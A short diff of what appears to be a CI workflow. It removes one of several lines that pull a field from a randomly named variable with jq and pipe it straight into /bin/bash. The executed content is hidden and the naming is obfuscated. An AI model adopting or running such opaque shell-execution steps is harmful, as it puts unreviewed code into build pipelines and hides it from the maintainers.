@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ogig82085" | jq -r .b3916 | /bin/bash
           echo $l7420 | jq -r .uzr72 | /bin/bash
           echo $ne9473 | jq -r .azw76 | /bin/bash
-          printf '%s' "$dxpi0" | jq -r .gqh32633 | /bin/bash
           echo $c72 | jq -r .d24 | /bin/bash
           echo $boqdy1454 | jq -r .k1505 | /bin/bash
           echo $v86104 | jq -r .gfuqv6112 | /bin/bash
